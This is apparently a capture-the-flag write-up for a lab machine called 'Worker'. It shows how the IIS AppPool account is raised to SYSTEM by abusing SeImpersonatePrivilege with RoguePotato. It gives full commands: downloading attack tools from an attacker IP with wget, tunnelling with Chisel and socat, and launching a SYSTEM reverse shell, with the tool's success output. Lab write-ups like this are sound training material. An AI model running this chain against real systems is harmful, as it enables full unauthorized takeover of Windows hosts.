# Alternative way to exploit Worker

## Privilege Escalation to System

It is possible to escalate privileges to SYSTEM with the initial user _IIS Appool\DefaultAppPool_ by exploiting the privileges.

This user has the _SeImpersonatePrivilege_ privilege set:
```
whoami /all

iis apppool\defaultapppool

Privilege Name                Description                               State   
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

To abuse this, the Local Privilege Escalation tool [RoguePotato](https://github.com/antonioCoco/RoguePotato) will be used.

Downloading _RoguePotato.exe_ to the box:
```
wget 10.10.14.7:8000/RoguePotato.exe -o rp.exe
```

We will use [Chisel](https://github.com/jpillora/chisel) to open and forward ports to our local client.

Starting the **Chisel server** on our local client:
```
./chisel server -p 8001 --reverse
```

Downloading _chisel.exe_ to the box and forwarding port 9999:
```
wget 10.10.14.7:8000/chisel.exe -o chisel.exe

.\chisel.exe client 10.10.14.7:8001 R:9999:localhost:9999
```

> NOTE: The Chisel client will make the shell not usable anymore, so another reverse shell has to be started to interact with the box.

Starting the `socat` connection to listen for port 135 on our local client:
```
socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999
```

Executing _RoguePotato.exe_ to run the _shell.ps1_ script:
```
.\rp.exe -r 10.10.14.7 -e "powershell C:\Windows\Temp\shell.ps1" -l 9999
```
```
(...)
[*] Client connected!
[+] Got SYSTEM Token!!!
[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: powershell C:\Windows\Temp\shell.ps1
[+] RoguePotato gave you the SYSTEM powerz :D
```

After it is successfully executed, the listener on my IP and port 9001 starts a reverse shell as SYSTEM!
